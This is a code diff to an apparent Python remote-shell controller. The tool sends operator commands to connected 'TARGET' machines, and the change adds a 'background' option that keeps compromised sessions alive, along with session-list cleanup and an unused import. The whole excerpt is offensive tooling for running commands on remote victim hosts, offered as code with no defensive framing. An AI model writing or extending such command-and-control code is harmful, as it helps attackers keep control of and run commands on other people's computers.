@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+from multiprocessing.connection import Client
 import socket
 import os
 import platform
@@ -272,12 +273,16 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
     :return: None
     """
     try:
+        maintain_session = True
         while sock:
             command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
             if command:
                 send_msg(sock, command)
                 # For certain keywords, run the appropriate action
                 if command in ["quit", "exit"]:  # Quit current client CLI
+                    maintain_session = False
+                    break
+                elif command in ["bg", "background"]:
                     break
                 elif command[:3] == "cd ":  # Change directory on the client side
                     pass
@@ -290,8 +295,9 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
     except ConnectionError as err:  # Socket connection error
         print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
     finally:  # Always close sockets when done
-        if sock:
+        if sock and not maintain_session:
             sock.close()
+            CLIENTS.remove((sock, addr))
 
 def display_sessions() -> None:
     """
